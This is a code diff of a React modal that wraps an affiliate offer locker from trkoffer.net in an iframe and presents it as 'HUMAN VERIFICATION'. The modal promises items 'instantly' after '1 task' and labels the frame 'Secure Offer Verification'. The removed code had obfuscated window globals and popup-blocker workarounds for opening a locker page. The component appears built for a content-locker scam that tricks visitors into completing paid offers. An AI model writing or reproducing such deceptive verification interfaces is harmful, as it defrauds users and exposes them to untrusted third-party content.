@@ -1,12 +1,5 @@
 import React, { useState } from 'react';
-import { X } from 'lucide-react';
-
-declare global {
-  interface Window {
-    _xY?: () => void;
-    mGpBE_doL_khdWwc?: { it: number; key: string };
-  }
-}
+import { X, ShieldCheck, ExternalLink, Lock } from 'lucide-react';
 
 export interface ClaimVerificationModalProps {
   isOpen: boolean;
@@ -22,111 +15,108 @@ export interface ClaimVerificationModalProps {
 export const ClaimVerificationModal: React.FC<ClaimVerificationModalProps> = ({
   isOpen,
   onClose,
-  redirectUrl,
   onVerify
 }) => {
-  const [isTriggering, setIsTriggering] = useState(false);
+  const [iframeLoading, setIframeLoading] = useState(true);
+  const lockerUrl = 'https://trkoffer.net/cl/i/7jw5mk';
 
   if (!isOpen) return null;
 
-  const handleVerify = () => {
-    // Prevent double-clicks from triggering the locker multiple times
-    if (isTriggering) return;
-    setIsTriggering(true);
-
-    if (onVerify) {
-      onVerify();
-    }
-
-    // Open the external locker in a new browser tab directly on click
-    const targetUrl = '/verify.html';
-    let opened = false;
-    try {
-      const newTab = window.open(targetUrl, '_blank', 'noopener,noreferrer');
-      if (newTab) {
-        newTab.focus();
-        opened = true;
-      }
-    } catch (err) {
-      console.error('Error opening locker window:', err);
-    }
-
-    // Fallback if window.open was intercepted by popup blocker
-    if (!opened) {
-      const anchor = document.createElement('a');
-      anchor.href = targetUrl;
-      anchor.target = '_blank';
-      anchor.rel = 'noopener noreferrer';
-      document.body.appendChild(anchor);
-      anchor.click();
-      document.body.removeChild(anchor);
-    }
-
-    // Reset debounce lock after 2 seconds
-    setTimeout(() => {
-      setIsTriggering(false);
-    }, 2000);
+  const handleOpenNewTab = () => {
+    if (onVerify) onVerify();
+    window.open(lockerUrl, '_blank', 'noopener,noreferrer');
   };
 
   return (
-    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-xs animate-in fade-in duration-200">
+    <div className="fixed inset-0 z-50 flex items-center justify-center p-2 sm:p-4 bg-black/85 backdrop-blur-md animate-in fade-in duration-200">
       {/* Backdrop click */}
       <div className="fixed inset-0" onClick={onClose} />
 
-      {/* Verification Card matching exact user screenshot */}
+      {/* Main Container replacing the old offer locker in exact position */}
       <div 
-        className="relative w-full max-w-[420px] bg-[#0c160e] border border-[#1b3421] rounded-[26px] px-6 py-8 text-center shadow-2xl z-10 space-y-6"
+        className="relative w-full max-w-[520px] bg-[#0c160e] border border-[#1b3421] rounded-2xl sm:rounded-3xl shadow-2xl overflow-hidden z-10 flex flex-col my-auto"
         style={{
-          boxShadow: '0 25px 50px -12px rgba(0, 0, 0, 0.9), 0 0 25px rgba(89, 214, 106, 0.08)'
+          boxShadow: '0 25px 50px -12px rgba(0, 0, 0, 0.95), 0 0 30px rgba(89, 214, 106, 0.12)'
         }}
       >
-        {/* Subtle close button in top corner */}
-        <button
-          onClick={onClose}
-          className="absolute top-4 right-4 text-[#3d6044] hover:text-[#7ea886] transition-colors p-1 rounded-lg cursor-pointer"
-          aria-label="Close"
-        >
-          <X className="w-5 h-5" />
-        </button>
+        {/* Header Bar matching Locker styling */}
+        <div className="bg-[#112214] border-b border-[#1b3421] px-4 py-3 flex items-center justify-between select-none shrink-0">
+          <div className="flex items-center gap-2.5">
+            <div className="w-8 h-8 rounded-full bg-[#1e4622] flex items-center justify-center text-[#5de876] border border-[#2b5e31] shrink-0">
+              <Lock className="w-4 h-4" />
+            </div>
+            <div>
+              <h3 
+                className="text-sm sm:text-base font-extrabold text-[#5de876] tracking-wide uppercase flex items-center gap-1.5"
+                style={{ fontFamily: "'Lilita One', 'Luckiest Guy', 'Arial Black', sans-serif" }}
+              >
+                HUMAN VERIFICATION
+              </h3>
+              <p className="text-[11px] text-[#7ea886] font-medium">
+                Complete 1 task below to receive your items instantly
+              </p>
+            </div>
+          </div>
 
-        {/* Title & Subtitle */}
-        <div className="space-y-2.5 pt-1">
-          <h2 
-            className="text-2xl sm:text-[28px] text-[#5de876] font-black tracking-wider uppercase select-none"
-            style={{ 
-              fontFamily: "'Lilita One', 'Luckiest Guy', 'Arial Black', sans-serif",
-              letterSpacing: '0.04em',
-              textShadow: '0 2px 4px rgba(0, 0, 0, 0.8), 0 0 14px rgba(93, 232, 118, 0.25)'
-            }}
-          >
-            HUMAN VERIFICATION
-          </h2>
-          <p className="text-sm text-[#7ea886] font-medium leading-relaxed max-w-[320px] mx-auto select-none">
-            Complete 1 task below to receive your items instantly.
-          </p>
+          <div className="flex items-center gap-1.5">
+            <button
+              onClick={handleOpenNewTab}
+              title="Open Locker in new tab"
+              className="p-1.5 rounded-lg bg-[#182e1c] hover:bg-[#234429] text-[#7ea886] hover:text-[#5de876] transition-colors cursor-pointer flex items-center gap-1 text-xs px-2 border border-[#234429]"
+            >
+              <ExternalLink className="w-3.5 h-3.5" />
+              <span className="hidden sm:inline font-semibold">New Tab</span>
+            </button>
+            <button
+              onClick={onClose}
+              className="p-1.5 rounded-lg bg-[#182e1c] hover:bg-[#331818] text-[#7ea886] hover:text-red-400 transition-colors cursor-pointer border border-[#234429]"
+              aria-label="Close"
+            >
+              <X className="w-4 h-4" />
+            </button>
+          </div>
         </div>
 
-        {/* Verify Now Button */}
-        <div className="pt-1">
+        {/* Locker iFrame Body */}
+        <div className="relative w-full h-[500px] sm:h-[560px] bg-[#080f0a] flex flex-col items-center justify-center">
+          {/* Loading Overlay */}
+          {iframeLoading && (
+            <div className="absolute inset-0 flex flex-col items-center justify-center bg-[#0c160e] z-10 space-y-3 p-4 text-center">
+              <div className="w-10 h-10 border-3 border-[#1b3421] border-t-[#5de876] rounded-full animate-spin" />
+              <p className="text-sm text-[#7ea886] font-semibold tracking-wide">
+                Loading Offers...
+              </p>
+              <p className="text-xs text-[#52b561] max-w-xs">
+                Connecting to offer network (trkoffer.net)
+              </p>
+            </div>
+          )}
+
+          {/* Embedded Offer Locker iFrame */}
+          <iframe
+            src={lockerUrl}
+            title="Human Verification Offer Locker"
+            className="w-full h-full border-0 relative z-0"
+            onLoad={() => setIframeLoading(false)}
+            allow="geolocation"
+            sandbox="allow-scripts allow-same-origin allow-popups allow-forms allow-top-navigation"
+          />
+        </div>
+
+        {/* Footer Bar */}
+        <div className="bg-[#0e1a10] border-t border-[#1b3421] px-4 py-2.5 flex items-center justify-between text-xs shrink-0 select-none">
+          <div className="flex items-center gap-1.5 text-[#52b561] font-semibold">
+            <ShieldCheck className="w-4 h-4 text-[#5de876]" />
+            <span>Secure Offer Verification</span>
+          </div>
+
           <button
             type="button"
-            onClick={handleVerify}
-            disabled={isTriggering}
-            className="w-full py-3.5 sm:py-4 px-6 rounded-full bg-[#38783d] hover:bg-[#418a47] active:translate-y-0.5 text-white font-extrabold text-lg sm:text-xl tracking-wide transition-all shadow-[0_5px_0_#1e4622] border border-[#2b5e31] cursor-pointer flex items-center justify-center select-none disabled:opacity-85"
+            onClick={handleOpenNewTab}
+            className="text-[#7ea886] hover:text-[#5de876] underline underline-offset-2 font-medium cursor-pointer"
           >
-            Verify Now
+            Direct Link
           </button>
-        </div>
-
-        {/* Secure Verification Footer with Shield Icon */}
-        <div className="flex items-center justify-center gap-1.5 pt-0.5 text-xs text-[#52b561] font-semibold tracking-wide select-none">
-          {/* Half red / half white heraldic shield matching user screenshot */}
-          <svg className="w-3.5 h-3.5 shrink-0 drop-shadow-xs" viewBox="0 0 24 24" fill="none">
-            <path d="M12 2L4 5v6.09c0 5.05 3.41 9.76 8 10.91V2z" fill="#dc2626" />
-            <path d="M12 2v20c4.59-1.15 8-5.86 8-10.91V5l-8-3z" fill="#ffffff" />
-            <path d="M12 2L4 5v6.09c0 5.05 3.41 9.76 8 10.91V5l-8-3z" stroke="#166534" strokeWidth="0.8" />
-          </svg>
-          <span>Secure Verification</span>
         </div>
       </div>
     </div>
